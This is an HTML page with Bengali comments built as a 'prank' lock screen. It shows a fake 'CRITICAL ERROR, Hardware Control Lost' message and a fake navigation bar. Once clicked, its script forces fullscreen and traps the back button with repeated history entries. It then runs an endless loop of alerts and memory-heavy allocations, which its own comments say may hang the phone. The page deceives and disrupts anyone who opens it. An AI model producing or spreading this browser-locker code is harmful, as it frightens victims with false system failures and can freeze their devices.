<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Locked</title>
    <style>
        body {
            background-color: #000;
            color: white;
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: sans-serif;
            user-select: none;
        }
        h1 { color: #00ff00; text-align: center; font-size: 20px; }
        
        /* নকল নেভিগেশন বার - এটি আসল বাটনকে ঢেকে রাখার অভিনয় করবে */
        .fake-nav {
            position: absolute;
            bottom: 0;
            width: 100%;
            height: 50px;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: space-around;
            align-items: center;
            border-top: 1px solid #333;
        }
        .icon { width: 25px; height: 25px; border: 2px solid #777; border-radius: 5px; opacity: 0.5; }
        .circle { border-radius: 50%; }
    </style>
</head>
<body onclick="startHardPrank()">

    <div id="ui">
        <h1>CRITICAL ERROR 0x0045<br>Hardware Control Lost</h1>
        <p style="text-align:center; color: red;">Click to Force Restart</p>
    </div>

    <!-- নকল বাটনগুলো এখানে -->
    <div class="fake-nav">
        <div class="icon"></div> <!-- Recents -->
        <div class="icon circle"></div> <!-- Home -->
        <div class="icon" style="border-right:none; border-top:none; transform: rotate(45deg); width: 15px; height: 15px;"></div> <!-- Back -->
    </div>

    <script>
        function startHardPrank() {
            // ১. ফুল স্ক্রিন মোড (আসল বাটনগুলো আড়াল করার জন্য)
            let elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();

            // ২. ব্যাক বাটন ট্র্যাপ
            for(let i=0; i<50; i++) {
                window.history.pushState(null, null, window.location.href);
            }

            // ৩. মেমোরি জ্যাম লুপ (এটি ফোনকে স্লো করে দিবে ফলে বাটন কমান্ড নিতে দেরি করবে)
            // সতর্কবাণী: এটি ফোনকে হ্যাং করতে পারে
            setInterval(function() {
                // ইনফিনিট অ্যালার্ট
                alert("SYSTEM FAILURE: Physical buttons are non-responsive!");
                
                // মেমোরি লোড বাড়ানো
                let bigData = new Array(1000000).join("FREEZE");
                console.log(bigData);
            }, 100);
        }

        window.onpopstate = function() { window.history.go(1); };
    </script>
</body>
</html>
